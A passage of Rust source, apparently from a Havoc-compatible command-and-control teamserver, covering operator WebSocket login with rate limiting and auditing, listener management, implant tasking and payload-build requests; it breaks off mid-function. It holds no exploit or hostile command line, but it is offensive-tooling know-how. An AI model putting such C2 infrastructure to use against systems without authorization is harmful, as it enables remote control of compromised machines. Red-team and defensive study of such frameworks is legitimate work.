//! Operator WebSocket endpoint and connection tracking.

use std::collections::{BTreeMap, HashMap};
use std::net::{IpAddr, SocketAddr};
use std::sync::Arc;
use std::time::{Duration, Instant};

use axum::{
    Router,
    extract::{
        ConnectInfo, FromRef, State,
        ws::{Message as WsMessage, WebSocket, WebSocketUpgrade},
    },
    response::IntoResponse,
    routing::get,
};
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonInjectWay, DemonKerberosCommand,
    DemonProcessCommand, DemonSocketCommand, DemonTokenCommand,
};
use red_cell_common::operator::{
    BuildPayloadMessageInfo, BuildPayloadResponseInfo, EventCode, FlatInfo, Message, MessageHead,
    OperatorMessage, TeamserverLogInfo,
};
use red_cell_common::{AgentInfo, OperatorInfo};
use serde_json::Value;
use thiserror::Error;
use time::OffsetDateTime;
use tokio::sync::RwLock;
use tracing::{debug, info, instrument, warn};
use uuid::Uuid;

use crate::{
    AgentRegistry, AuditResultStatus, AuditWebhookNotifier, AuthError, AuthService,
    AuthenticationFailure, AuthenticationResult, Database, EventBus, Job, ListenerEventAction,
    ListenerManager, PayloadBuilderService, SocketRelayManager, action_from_mark,
    agent_events::agent_new_event, audit_details, authorize_websocket_command,
    listener_config_from_operator, listener_error_event, listener_event_for_action,
    listener_removed_event, login_failure_message, login_parameters, login_success_message,
    operator_requests_start, parameter_object, record_operator_action_with_notifications,
};

const DEMON_MAX_RESPONSE_LENGTH: usize = 0x01E0_0000;

/// Tracks currently connected operator WebSocket clients.
#[derive(Debug, Clone, Default)]
pub struct OperatorConnectionManager {
    connections: Arc<RwLock<BTreeMap<Uuid, OperatorConnection>>>,
}

impl OperatorConnectionManager {
    /// Create an empty connection registry.
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// Return the number of currently open WebSocket connections.
    #[instrument(skip(self))]
    pub async fn connection_count(&self) -> usize {
        self.connections.read().await.len()
    }

    /// Return the number of authenticated WebSocket connections.
    #[instrument(skip(self))]
    pub async fn authenticated_count(&self) -> usize {
        self.connections
            .read()
            .await
            .values()
            .filter(|connection| connection.username.is_some())
            .count()
    }

    async fn register(&self, id: Uuid) {
        self.connections.write().await.insert(id, OperatorConnection { username: None });
    }

    async fn authenticate(&self, id: Uuid, username: String) {
        if let Some(connection) = self.connections.write().await.get_mut(&id) {
            connection.username = Some(username);
        }
    }

    async fn unregister(&self, id: Uuid) {
        self.connections.write().await.remove(&id);
    }
}

#[derive(Debug, Clone, Default)]
struct OperatorConnection {
    username: Option<String>,
}

/// Maximum failed login attempts per IP within the sliding window.
const MAX_FAILED_LOGIN_ATTEMPTS: u32 = 5;

/// Duration of the sliding window for tracking failed login attempts.
const LOGIN_WINDOW_DURATION: Duration = Duration::from_secs(60);

/// Maximum number of IP windows retained before oldest entries are evicted.
const MAX_LOGIN_ATTEMPT_WINDOWS: usize = 10_000;

/// Delay applied before responding to a failed login attempt to slow brute-force attacks.
const FAILED_LOGIN_DELAY: Duration = Duration::from_secs(2);

/// Maximum time an unauthenticated socket may idle before sending the first login frame.
const AUTHENTICATION_FRAME_TIMEOUT: Duration = Duration::from_secs(5);

/// Per-source-IP rate limiter for WebSocket operator login attempts.
///
/// Tracks failed login attempts in a sliding window per IP address. Once the
/// maximum number of failures is reached, further attempts from that IP are
/// rejected until the window expires.
#[derive(Debug, Clone, Default)]
pub struct LoginRateLimiter {
    windows: Arc<tokio::sync::Mutex<HashMap<IpAddr, LoginAttemptWindow>>>,
}

#[derive(Debug)]
struct LoginAttemptWindow {
    failed_attempts: u32,
    window_start: Instant,
}

impl Default for LoginAttemptWindow {
    fn default() -> Self {
        Self { failed_attempts: 0, window_start: Instant::now() }
    }
}

impl LoginRateLimiter {
    /// Create an empty rate limiter.
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// Return `true` if the given IP has not exceeded the failed-attempt threshold.
    async fn is_allowed(&self, ip: IpAddr) -> bool {
        let mut windows = self.windows.lock().await;
        let Some(window) = windows.get_mut(&ip) else {
            return true;
        };

        if window.window_start.elapsed() >= LOGIN_WINDOW_DURATION {
            windows.remove(&ip);
            return true;
        }

        window.failed_attempts < MAX_FAILED_LOGIN_ATTEMPTS
    }

    /// Record a failed login attempt from the given IP.
    async fn record_failure(&self, ip: IpAddr) {
        let mut windows = self.windows.lock().await;
        let now = Instant::now();

        prune_expired_login_windows(&mut windows, now);
        if !windows.contains_key(&ip) && windows.len() >= MAX_LOGIN_ATTEMPT_WINDOWS {
            evict_oldest_login_windows(&mut windows, MAX_LOGIN_ATTEMPT_WINDOWS / 2);
        }

        let window = windows.entry(ip).or_default();

        if now.duration_since(window.window_start) >= LOGIN_WINDOW_DURATION {
            window.failed_attempts = 1;
            window.window_start = now;
        } else {
            window.failed_attempts += 1;
        }
    }

    /// Clear the failure counter for an IP after a successful login.
    async fn record_success(&self, ip: IpAddr) {
        self.windows.lock().await.remove(&ip);
    }

    /// Return the number of IPs currently tracked (for tests).
    #[cfg(test)]
    async fn tracked_ip_count(&self) -> usize {
        self.windows.lock().await.len()
    }
}

fn prune_expired_login_windows(windows: &mut HashMap<IpAddr, LoginAttemptWindow>, now: Instant) {
    windows.retain(|_, window| now.duration_since(window.window_start) < LOGIN_WINDOW_DURATION);
}

fn evict_oldest_login_windows(
    windows: &mut HashMap<IpAddr, LoginAttemptWindow>,
    target_size: usize,
) {
    if windows.len() <= target_size {
        return;
    }

    let to_remove = windows.len() - target_size;
    let mut entries: Vec<_> =
        windows.iter().map(|(ip, window)| (*ip, window.window_start)).collect();
    entries.sort_unstable_by_key(|(_, window_start)| *window_start);
    for (ip, _) in entries.into_iter().take(to_remove) {
        windows.remove(&ip);
    }
}

/// Register the Havoc-compatible operator WebSocket endpoint at `/`.
pub fn routes<S>() -> Router<S>
where
    S: Clone + Send + Sync + 'static,
    AuthService: FromRef<S>,
    EventBus: FromRef<S>,
    ListenerManager: FromRef<S>,
    AgentRegistry: FromRef<S>,
    SocketRelayManager: FromRef<S>,
    PayloadBuilderService: FromRef<S>,
    OperatorConnectionManager: FromRef<S>,
    LoginRateLimiter: FromRef<S>,
    AuditWebhookNotifier: FromRef<S>,
    Database: FromRef<S>,
{
    Router::new().route("/", get(websocket_handler::<S>))
}

/// Upgrade a `/havoc/` HTTP request to the operator WebSocket protocol.
#[instrument(skip(state, websocket))]
pub async fn websocket_handler<S>(
    State(state): State<S>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    websocket: WebSocketUpgrade,
) -> impl IntoResponse
where
    S: Clone + Send + Sync + 'static,
    AuthService: FromRef<S>,
    EventBus: FromRef<S>,
    ListenerManager: FromRef<S>,
    AgentRegistry: FromRef<S>,
    SocketRelayManager: FromRef<S>,
    PayloadBuilderService: FromRef<S>,
    OperatorConnectionManager: FromRef<S>,
    LoginRateLimiter: FromRef<S>,
    AuditWebhookNotifier: FromRef<S>,
    Database: FromRef<S>,
{
    websocket.on_upgrade(move |socket| handle_operator_socket(state, socket, addr.ip()))
}

async fn handle_operator_socket<S>(state: S, mut socket: WebSocket, client_ip: IpAddr)
where
    S: Clone + Send + Sync + 'static,
    AuthService: FromRef<S>,
    EventBus: FromRef<S>,
    ListenerManager: FromRef<S>,
    AgentRegistry: FromRef<S>,
    SocketRelayManager: FromRef<S>,
    PayloadBuilderService: FromRef<S>,
    OperatorConnectionManager: FromRef<S>,
    LoginRateLimiter: FromRef<S>,
    AuditWebhookNotifier: FromRef<S>,
    Database: FromRef<S>,
{
    let connection_id = Uuid::new_v4();
    let auth = AuthService::from_ref(&state);
    let connections = OperatorConnectionManager::from_ref(&state);
    let database = Database::from_ref(&state);
    let rate_limiter = LoginRateLimiter::from_ref(&state);
    let webhooks = AuditWebhookNotifier::from_ref(&state);

    connections.register(connection_id).await;

    if handle_authentication(
        &auth,
        &connections,
        &database,
        &webhooks,
        &rate_limiter,
        connection_id,
        client_ip,
        &mut socket,
    )
    .await
    .is_err()
    {
        cleanup_connection(
            &auth,
            &connections,
            &EventBus::from_ref(&state),
            &database,
            &webhooks,
            connection_id,
        )
        .await;
        return;
    }

    let Some(session) = auth.session_for_connection(connection_id).await else {
        let _ = socket.send(WsMessage::Close(None)).await;
        cleanup_connection(
            &auth,
            &connections,
            &EventBus::from_ref(&state),
            &database,
            &webhooks,
            connection_id,
        )
        .await;
        return;
    };

    let event_bus = EventBus::from_ref(&state);
    if first_online_session(&auth, &session.username).await {
        event_bus.broadcast(chat_presence_event(&session.username, true));
    }

    log_operator_action(
        &database,
        &webhooks,
        &session.username,
        "operator.connect",
        "operator",
        Some(session.username.clone()),
        audit_details(
            AuditResultStatus::Success,
            None,
            Some("connect"),
            Some(parameter_object([("connection_id", Value::String(connection_id.to_string()))])),
        ),
    )
    .await;

    info!(
        %connection_id,
        username = %session.username,
        "operator authenticated"
    );

    let mut event_receiver = event_bus.subscribe();
    if let Err(error) = send_session_snapshot(
        &mut socket,
        &auth,
        &event_bus,
        &ListenerManager::from_ref(&state),
        &AgentRegistry::from_ref(&state),
    )
    .await
    {
        warn!(
            connection_id = %session.connection_id,
            username = %session.username,
            %error,
            "failed to synchronize operator session state"
        );
        cleanup_connection(&auth, &connections, &event_bus, &database, &webhooks, connection_id)
            .await;
        return;
    }

    loop {
        tokio::select! {
            incoming = socket.recv() => {
                match handle_incoming_frame(&state, &mut socket, &session, incoming).await {
                    Ok(SocketLoopControl::Continue) => {}
                    Ok(SocketLoopControl::Break) | Err(()) => break,
                }
            }
            event = event_receiver.recv() => {
                let Some(event) = event else {
                    break;
                };

                if send_operator_message(&mut socket, &event).await.is_err() {
                    break;
                }
            }
        }
    }

    cleanup_connection(&auth, &connections, &event_bus, &database, &webhooks, connection_id).await;
}

async fn handle_authentication(
    auth: &AuthService,
    connections: &OperatorConnectionManager,
    database: &Database,
    webhooks: &AuditWebhookNotifier,
    rate_limiter: &LoginRateLimiter,
    connection_id: Uuid,
    client_ip: IpAddr,
    socket: &mut WebSocket,
) -> Result<(), ()> {
    if !rate_limiter.is_allowed(client_ip).await {
        warn!(
            %connection_id,
            %client_ip,
            "login rate limit exceeded — rejecting connection"
        );
        send_login_error(socket, "", AuthenticationFailure::WrongPassword, connection_id).await;
        return Err(());
    }

    let frame = match tokio::time::timeout(AUTHENTICATION_FRAME_TIMEOUT, socket.recv()).await {
        Ok(Some(frame)) => frame,
        Ok(None) => {
            warn!(%connection_id, "operator websocket closed before authentication");
            return Err(());
        }
        Err(_) => {
            warn!(
                %connection_id,
                timeout_secs = AUTHENTICATION_FRAME_TIMEOUT.as_secs(),
                "operator websocket authentication timed out"
            );
            let _ = socket.send(WsMessage::Close(None)).await;
            return Err(());
        }
    };

    let message = match frame {
        Ok(WsMessage::Text(payload)) => payload,
        Ok(WsMessage::Close(_)) => return Err(()),
        Ok(other) => {
            warn!(%connection_id, frame = ?other, "operator websocket requires text login frame");
            let _ = send_operator_message(
                socket,
                &login_failure_message("", &AuthenticationFailure::WrongPassword),
            )
            .await;
            let _ = socket.send(WsMessage::Close(None)).await;
            return Err(());
        }
        Err(error) => {
            warn!(%connection_id, %error, "failed to receive operator authentication frame");
            return Err(());
        }
    };

    let login_user = serde_json::from_str::<OperatorMessage>(message.as_str())
        .ok()
        .and_then(|message| match message {
            OperatorMessage::Login(message) => Some(message.info.user),
            _ => None,
        })
        .unwrap_or_default();

    let response = match auth.authenticate_message(connection_id, message.as_str()).await {
        Ok(AuthenticationResult::Success(success)) => {
            connections.authenticate(connection_id, success.username.clone()).await;
            rate_limiter.record_success(client_ip).await;
            log_operator_action(
                database,
                webhooks,
                &success.username,
                "operator.login",
                "operator",
                Some(success.username.clone()),
                audit_details(
                    AuditResultStatus::Success,
                    None,
                    Some("login"),
                    Some(login_parameters(&success.username, &connection_id)),
                ),
            )
            .await;
            login_success_message(&success.username, &success.token)
        }
        Ok(AuthenticationResult::Failure(failure)) => {
            tokio::time::sleep(FAILED_LOGIN_DELAY).await;
            rate_limiter.record_failure(client_ip).await;
            log_operator_action(
                database,
                webhooks,
                &login_user,
                "operator.login",
                "operator",
                (!login_user.is_empty()).then_some(login_user.clone()),
                audit_details(
                    AuditResultStatus::Failure,
                    None,
                    Some("login"),
                    Some(login_parameters(&login_user, &connection_id)),
                ),
            )
            .await;
            send_login_error(socket, "", failure, connection_id).await;
            return Err(());
        }
        Err(AuthError::InvalidLoginMessage) => {
            tokio::time::sleep(FAILED_LOGIN_DELAY).await;
            rate_limiter.record_failure(client_ip).await;
            log_operator_action(
                database,
                webhooks,
                &login_user,
                "operator.login",
                "operator",
                (!login_user.is_empty()).then_some(login_user.clone()),
                audit_details(
                    AuditResultStatus::Failure,
                    None,
                    Some("login"),
                    Some(login_parameters(&login_user, &connection_id)),
                ),
            )
            .await;
            send_login_error(socket, "", AuthenticationFailure::WrongPassword, connection_id).await;
            return Err(());
        }
        Err(AuthError::InvalidMessageJson(error)) => {
            warn!(%connection_id, %error, "failed to parse operator login message");
            tokio::time::sleep(FAILED_LOGIN_DELAY).await;
            rate_limiter.record_failure(client_ip).await;
            log_operator_action(
                database,
                webhooks,
                "",
                "operator.login",
                "operator",
                None,
                audit_details(
                    AuditResultStatus::Failure,
                    None,
                    Some("login"),
                    Some(parameter_object([
                        ("connection_id", Value::String(connection_id.to_string())),
                        ("error", Value::String(error)),
                    ])),
                ),
            )
            .await;
            send_login_error(socket, "", AuthenticationFailure::WrongPassword, connection_id).await;
            return Err(());
        }
        Err(
            AuthError::DuplicateUser { .. } | AuthError::EmptyUsername | AuthError::EmptyPassword,
        ) => {
            tokio::time::sleep(FAILED_LOGIN_DELAY).await;
            rate_limiter.record_failure(client_ip).await;
            send_login_error(socket, "", AuthenticationFailure::WrongPassword, connection_id).await;
            return Err(());
        }
        Err(AuthError::Persistence(error)) => {
            warn!(%connection_id, %error, "operator authentication persistence failed");
            tokio::time::sleep(FAILED_LOGIN_DELAY).await;
            rate_limiter.record_failure(client_ip).await;
            send_login_error(socket, "", AuthenticationFailure::WrongPassword, connection_id).await;
            return Err(());
        }
    };

    if send_operator_message(socket, &response).await.is_err() {
        return Err(());
    }

    Ok(())
}

async fn handle_incoming_frame<S>(
    state: &S,
    socket: &mut WebSocket,
    session: &crate::OperatorSession,
    incoming: Option<Result<WsMessage, axum::Error>>,
) -> Result<SocketLoopControl, ()>
where
    S: Clone + Send + Sync + 'static,
    EventBus: FromRef<S>,
    ListenerManager: FromRef<S>,
    AgentRegistry: FromRef<S>,
    SocketRelayManager: FromRef<S>,
    PayloadBuilderService: FromRef<S>,
    AuditWebhookNotifier: FromRef<S>,
    Database: FromRef<S>,
{
    let Some(frame) = incoming else {
        return Ok(SocketLoopControl::Break);
    };

    match frame {
        Ok(WsMessage::Text(payload)) => {
            let message = match serde_json::from_str::<OperatorMessage>(payload.as_str()) {
                Ok(message) => message,
                Err(error) => {
                    warn!(
                        connection_id = %session.connection_id,
                        username = %session.username,
                        %error,
                        "failed to parse operator websocket message"
                    );
                    let _ = socket.send(WsMessage::Close(None)).await;
                    return Err(());
                }
            };

            match authorize_websocket_command(session, &message) {
                Ok(permission) => {
                    debug!(
                        connection_id = %session.connection_id,
                        username = %session.username,
                        role = ?session.role,
                        permission = permission.as_str(),
                        event = ?message.event_code(),
                        "dispatching operator websocket command"
                    );

                    dispatch_operator_command(state, session, message).await;
                    Ok(SocketLoopControl::Continue)
                }
                Err(error) => {
                    warn!(
                        connection_id = %session.connection_id,
                        username = %session.username,
                        role = ?session.role,
                        %error,
                        "rejecting unauthorized operator websocket command"
                    );
                    let _ = socket.send(WsMessage::Close(None)).await;
                    Err(())
                }
            }
        }
        Ok(WsMessage::Close(_)) => Ok(SocketLoopControl::Break),
        Ok(WsMessage::Ping(payload)) => {
            if socket.send(WsMessage::Pong(payload)).await.is_err() {
                return Err(());
            }
            Ok(SocketLoopControl::Continue)
        }
        Ok(WsMessage::Pong(_)) => Ok(SocketLoopControl::Continue),
        Ok(WsMessage::Binary(_)) => Ok(SocketLoopControl::Continue),
        Err(error) => {
            warn!(
                connection_id = %session.connection_id,
                username = %session.username,
                %error,
                "operator websocket receive loop failed"
            );
            Err(())
        }
    }
}

async fn dispatch_operator_command<S>(
    state: &S,
    session: &crate::OperatorSession,
    message: OperatorMessage,
) where
    S: Clone + Send + Sync + 'static,
    EventBus: FromRef<S>,
    ListenerManager: FromRef<S>,
    AgentRegistry: FromRef<S>,
    SocketRelayManager: FromRef<S>,
    PayloadBuilderService: FromRef<S>,
    AuditWebhookNotifier: FromRef<S>,
    Database: FromRef<S>,
{
    let events = EventBus::from_ref(state);
    let listeners = ListenerManager::from_ref(state);
    let registry = AgentRegistry::from_ref(state);
    let sockets = SocketRelayManager::from_ref(state);
    let payload_builder = PayloadBuilderService::from_ref(state);
    let webhooks = AuditWebhookNotifier::from_ref(state);
    let database = Database::from_ref(state);

    match message {
        OperatorMessage::ListenerNew(message) => {
            let name = message.info.name.clone().unwrap_or_default();
            let parameters = serde_json::to_value(&message.info).ok();
            match listener_config_from_operator(&message.info) {
                Ok(config) => match listeners.create(config).await {
                    Ok(summary) => {
                        log_operator_action(
                            &database,
                            &webhooks,
                            &session.username,
                            "listener.create",
                            "listener",
                            Some(summary.name.clone()),
                            audit_details(
                                AuditResultStatus::Success,
                                None,
                                Some("create"),
                                parameters.clone(),
                            ),
                        )
                        .await;
                        events.broadcast(listener_event_for_action(
                            &session.username,
                            &summary,
                            ListenerEventAction::Created,
                        ));

                        if operator_requests_start(&message.info) {
                            match listeners.start(&summary.name).await {
                                Ok(started) => {
                                    log_operator_action(
                                        &database,
                                        &webhooks,
                                        &session.username,
                                        "listener.start",
                                        "listener",
                                        Some(started.name.clone()),
                                        audit_details(
                                            AuditResultStatus::Success,
                                            None,
                                            Some("start"),
                                            Some(parameter_object([(
                                                "listener",
                                                Value::String(started.name.clone()),
                                            )])),
                                        ),
                                    )
                                    .await;
                                    events.broadcast(listener_event_for_action(
                                        &session.username,
                                        &started,
                                        ListenerEventAction::Started,
                                    ));
                                }
                                Err(error) => {
                                    log_operator_action(
                                        &database,
                                        &webhooks,
                                        &session.username,
                                        "listener.start",
                                        "listener",
                                        Some(summary.name.clone()),
                                        audit_details(
                                            AuditResultStatus::Failure,
                                            None,
                                            Some("start"),
                                            Some(parameter_object([
                                                ("listener", Value::String(summary.name.clone())),
                                                ("error", Value::String(error.to_string())),
                                            ])),
                                        ),
                                    )
                                    .await;
                                    events.broadcast(listener_error_event(
                                        &session.username,
                                        &summary.name,
                                        &error,
                                    ));
                                }
                            }
                        }
                    }
                    Err(error) => {
                        log_operator_action(
                            &database,
                            &webhooks,
                            &session.username,
                            "listener.create",
                            "listener",
                            (!name.is_empty()).then_some(name.clone()),
                            audit_details(
                                AuditResultStatus::Failure,
                                None,
                                Some("create"),
                                Some(parameter_object([
                                    ("name", Value::String(name.clone())),
                                    ("error", Value::String(error.to_string())),
                                ])),
                            ),
                        )
                        .await;
                        events.broadcast(listener_error_event(&session.username, &name, &error));
                    }
                },
                Err(error) => {
                    log_operator_action(
                        &database,
                        &webhooks,
                        &session.username,
                        "listener.create",
                        "listener",
                        (!name.is_empty()).then_some(name.clone()),
                        audit_details(
                            AuditResultStatus::Failure,
                            None,
                            Some("create"),
                            Some(parameter_object([
                                ("name", Value::String(name.clone())),
                                ("error", Value::String(error.to_string())),
                            ])),
                        ),
                    )
                    .await;
                    events.broadcast(listener_error_event(&session.username, &name, &error));
                }
            }
        }
        OperatorMessage::ListenerEdit(message) => {
            let name = message.info.name.clone().unwrap_or_default();
            let parameters = serde_json::to_value(&message.info).ok();
            match listener_config_from_operator(&message.info) {
                Ok(config) => match listeners.update(config).await {
                    Ok(summary) => {
                        log_operator_action(
                            &database,
                            &webhooks,
                            &session.username,
                            "listener.update",
                            "listener",
                            Some(summary.name.clone()),
                            audit_details(
                                AuditResultStatus::Success,
                                None,
                                Some("update"),
                                serde_json::to_value(&summary.config).ok(),
                            ),
                        )
                        .await;
                        events.broadcast(listener_event_for_action(
                            &session.username,
                            &summary,
                            ListenerEventAction::Updated,
                        ));
                    }
                    Err(error) => {
                        log_operator_action(
                            &database,
                            &webhooks,
                            &session.username,
                            "listener.update",
                            "listener",
                            (!name.is_empty()).then_some(name.clone()),
                            audit_details(
                                AuditResultStatus::Failure,
                                None,
                                Some("update"),
                                Some(parameter_object([
                                    ("config", parameters.clone().unwrap_or(Value::Null)),
                                    ("error", Value::String(error.to_string())),
                                ])),
                            ),
                        )
                        .await;
                        events.broadcast(listener_error_event(&session.username, &name, &error));
                    }
                },
                Err(error) => {
                    log_operator_action(
                        &database,
                        &webhooks,
                        &session.username,
                        "listener.update",
                        "listener",
                        (!name.is_empty()).then_some(name.clone()),
                        audit_details(
                            AuditResultStatus::Failure,
                            None,
                            Some("update"),
                            Some(parameter_object([
                                ("config", parameters.unwrap_or(Value::Null)),
                                ("error", Value::String(error.to_string())),
                            ])),
                        ),
                    )
                    .await;
                    events.broadcast(listener_error_event(&session.username, &name, &error));
                }
            }
        }
        OperatorMessage::ListenerRemove(message) => {
            let name = message.info.name;
            match listeners.delete(&name).await {
                Ok(()) => {
                    log_operator_action(
                        &database,
                        &webhooks,
                        &session.username,
                        "listener.delete",
                        "listener",
                        (!name.is_empty()).then_some(name.clone()),
                        audit_details(
                            AuditResultStatus::Success,
                            None,
                            Some("delete"),
                            Some(parameter_object([("name", Value::String(name.clone()))])),
                        ),
                    )
                    .await;
                    events.broadcast(listener_removed_event(&session.username, &name));
                }
                Err(error) => {
                    log_operator_action(
                        &database,
                        &webhooks,
                        &session.username,
                        "listener.delete",
                        "listener",
                        (!name.is_empty()).then_some(name.clone()),
                        audit_details(
                            AuditResultStatus::Failure,
                            None,
                            Some("delete"),
                            Some(parameter_object([
                                ("name", Value::String(name.clone())),
                                ("error", Value::String(error.to_string())),
                            ])),
                        ),
                    )
                    .await;
                    events.broadcast(listener_error_event(&session.username, &name, &error));
                }
            }
        }
        OperatorMessage::ListenerMark(message) => {
            let name = message.info.name.clone();
            let mark = message.info.mark.clone();
            let result = match action_from_mark(&message.info.mark) {
                Ok(ListenerEventAction::Started) => listeners.start(&message.info.name).await,
                Ok(ListenerEventAction::Stopped) => listeners.stop(&message.info.name).await,
                Ok(ListenerEventAction::Created | ListenerEventAction::Updated) => unreachable!(),
                Err(error) => Err(error),
            };

            match result {
                Ok(summary) => {
                    let action = if summary.state.status == crate::ListenerStatus::Running {
                        ListenerEventAction::Started
                    } else {
                        ListenerEventAction::Stopped
                    };
                    let audit_action = if summary.state.status == crate::ListenerStatus::Running {
                        "listener.start"
                    } else {
                        "listener.stop"
                    };
                    log_operator_action(
                        &database,
                        &webhooks,
                        &session.username,
                        audit_action,
                        "listener",
                        Some(summary.name.clone()),
                        audit_details(
                            AuditResultStatus::Success,
                            None,
                            Some(mark.as_str()),
                            Some(parameter_object([("mark", Value::String(mark.clone()))])),
                        ),
                    )
                    .await;
                    events.broadcast(listener_event_for_action(
                        &session.username,
                        &summary,
                        action,
                    ));
                }
                Err(error) => {
                    let audit_action = if mark.eq_ignore_ascii_case("start")
                        || mark.eq_ignore_ascii_case("online")
                    {
                        "listener.start"
                    } else {
                        "listener.stop"
                    };
                    log_operator_action(
                        &database,
                        &webhooks,
                        &session.username,
                        audit_action,
                        "listener",
                        Some(name.clone()),
                        audit_details(
                            AuditResultStatus::Failure,
                            None,
                            Some(mark.as_str()),
                            Some(parameter_object([
                                ("mark", Value::String(mark.clone())),
                                ("error", Value::String(error.to_string())),
                            ])),
                        ),
                    )
                    .await;
                    events.broadcast(listener_error_event(&session.username, &name, &error));
                }
            }
        }
        OperatorMessage::AgentTask(message) => {
            if let Err(error) = handle_agent_task(
                &registry,
                &sockets,
                &events,
                &database,
                &webhooks,
                session,
                sanitize_agent_task(session, message),
            )
            .await
            {
                events.broadcast(teamserver_log_event(&session.username, &error.to_string()));
            }
        }
        OperatorMessage::AgentRemove(message) => {
            if let Err(error) = handle_agent_remove(
                &registry,
                &sockets,
                &events,
                &database,
                &webhooks,
                session,
                sanitize_agent_remove(session, message),
            )
            .await
            {
                events.broadcast(teamserver_log_event(&session.username, &error.to_string()));
            }
        }
        OperatorMessage::BuildPayloadRequest(message) => {
            let actor = session.username.clone();
            let events = events.clone();
            let listeners = listeners.clone();
            let payload_builder = payload_builder.clone();

            tokio::spawn(async move {
                let summary = match listeners.summary(&message.info.listener).await {
                    Ok(summary) => summary,
                    Err(error) => {
                        events.broadcast(build_payload_message_event(
                            &actor,
                            "Error",
                            &error.to_string(),
                        ));
                        return;
                    }
                };

                match payload_builder
                    .build_payload(&summary.config, &message.info, |entry| {
                        events.broadcast(build_payload_message_event(
                            &actor,
                            &entry.level,
                            &entry.message,
                        ));
                    })
                    .await
                {
                    Ok(artifact) => {
                        events.broadcast(build_payload_response_event(
                            &actor,
                            &artifact.file_name,
                            &artifact.format,
                            artifact.bytes.as_slice(),
                        ));
                    }
                    Err(error) => {
                        events.broadcast(build_payload_message_event(
                            &actor,
                            "Error",
                            &error.to_string(),
                        ));
                    }
                }
            });
        }
        OperatorMessage::ChatMessage(message) => {
            let text = flat_info_string(&message.info, &["Message", "Text"]).unwrap_or_default();
            if !text.trim().is_empty() {
                let trimmed = text.trim();
                events.broadcast(chat_message_event(&session.username, trimmed));
                log_operator_action(
                    &database,
                    &webhooks,
                    &session.username,
                    "operator.chat",
                    "operator",
                    Some(session.username.clone()),
                    audit_details(
                        AuditResultStatus::Success,
                        None,
                        Some("chat"),
                        Some(parameter_object([("message", Value::String(trimmed.to_owned()))])),
                    ),
                )
                .await;
            }
        }
        other => {
            debug!(
                connection_id = %session.connection_id,
                username = %session.username,
                event = ?other.event_code(),
                "operator websocket command has no registered handler yet"
            );
        }
    }
}

#[derive(Debug, Error)]
pub(crate) enum AgentCommandError {
    #[error("invalid agent id `{agent_id}`")]
    InvalidAgentId { agent_id: String },
    #[error("agent id is required")]
    MissingAgentId,
    #[error("agent note is required")]
    MissingNote,
    #[error("unsupported agent remove payload")]
    InvalidRemovePayload,
    #[error("invalid numeric command id `{command_id}`")]
    InvalidCommandId { command_id: String },
    #[error("missing required field `{field}`")]
    MissingField { field: &'static str },
    #[error("invalid boolean field `{field}`: `{value}`")]
    InvalidBooleanField { field: String, value: String },
    #[error("invalid numeric field `{field}`: `{value}`")]
    InvalidNumericField { field: String, value: String },
    #[error("invalid base64 field `{field}`: {message}")]
    InvalidBase64Field { field: String, message: String },
    #[error("unsupported process subcommand `{subcommand}`")]
    UnsupportedProcessSubcommand { subcommand: String },
    #[error("unsupported filesystem subcommand `{subcommand}`")]
    UnsupportedFilesystemSubcommand { subcommand: String },
    #[error("unsupported token subcommand `{subcommand}`")]
    UnsupportedTokenSubcommand { subcommand: String },
    #[error("unsupported socket subcommand `{subcommand}`")]
    UnsupportedSocketSubcommand { subcommand: String },
    #[error("unsupported kerberos subcommand `{subcommand}`")]
    UnsupportedKerberosSubcommand { subcommand: String },
    #[error("invalid hex task id `{task_id}`")]
    InvalidTaskId { task_id: String },
    #[error("unsupported injection way `{way}`")]
    UnsupportedInjectionWay { way: String },
    #[error("unsupported injection technique `{technique}`")]
    UnsupportedInjectionTechnique { technique: String },
    #[error("unsupported process architecture `{arch}`")]
    UnsupportedArchitecture { arch: String },
    #[error("invalid process create arguments: expected `state;verbose;piped;program;base64_args`")]
    InvalidProcessCreateArguments,
    #[error(transparent)]
    Teamserver(#[from] crate::TeamserverError),
    #[error(transparent)]
    Plugin(#[from] crate::PluginError),
    #[error(transparent)]
    SocketRelay(#[from] crate::SocketRelayError),
}

async fn handle_agent_task(
    registry: &AgentRegistry,
    sockets: &SocketRelayManager,
    events: &EventBus,
    database: &Database,
    webhooks: &AuditWebhookNotifier,
    session: &crate::OperatorSession,
    message: Message<red_cell_common::operator::AgentTaskInfo>,
) -> Result<(), AgentCommandError> {
    let agent_id = parse_agent_id(&message.info.demon_id)?;
    let command = message.info.command.clone().unwrap_or_else(|| message.info.command_line.clone());
    let parameters = serde_json::to_value(&message.info).ok();
    match execute_agent_task(registry, sockets, events, &session.username, message).await {
        Ok(_) => {
            log_operator_action(
                database,
                webhooks,
                &session.username,
                "agent.task",
                "agent",
                Some(format!("{agent_id:08X}")),
                audit_details(
                    AuditResultStatus::Success,
                    Some(agent_id),
                    Some(command.as_str()),
                    parameters,
                ),
            )
            .await;
        }
        Err(error) => {
            log_operator_action(
                database,
                webhooks,
                &session.username,
                "agent.task",
                "agent",
                Some(format!("{agent_id:08X}")),
                audit_details(
                    AuditResultStatus::Failure,
                    Some(agent_id),
                    Some(command.as_str()),
                    Some(parameter_object([
                        ("task", parameters.unwrap_or(Value::Null)),
                        ("error", Value::String(error.to_string())),
                    ])),
                ),
            )
            .await;
            return Err(error);
        }
    }
    debug!(
        connection_id = %session.connection_id,
        username = %session.username,
        agent_id = format_args!("{agent_id:08X}"),
        "handled operator agent task command"
    );
    Ok(())
}

pub(crate) async fn execute_agent_task(
    registry: &AgentRegistry,
    sockets: &SocketRelayManager,
    events: &EventBus,
    actor: &str,
    mut message: Message<red_cell_common::operator::AgentTaskInfo>,
) -> Result<usize, AgentCommandError> {
    message.head.user = actor.to_owned();
    let agent_id = parse_agent_id(&message.info.demon_id)?;
    let _agent =
        registry.get(agent_id).await.ok_or(crate::TeamserverError::AgentNotFound { agent_id })?;

    let queued_jobs = if let Some(note) = note_from_task(&message.info)? {
        registry.set_note(agent_id, note).await?;
        0
    } else if let Some(result) =
        handle_teamserver_socket_task(sockets, agent_id, &message.info).await?
    {
        events.broadcast(teamserver_log_event(actor, &result));
        0
    } else {
        let handled_by_plugin = if let Some(plugins) = crate::PluginRuntime::current()? {
            if let Some((command, args)) = plugins.match_registered_command(&message.info).await {
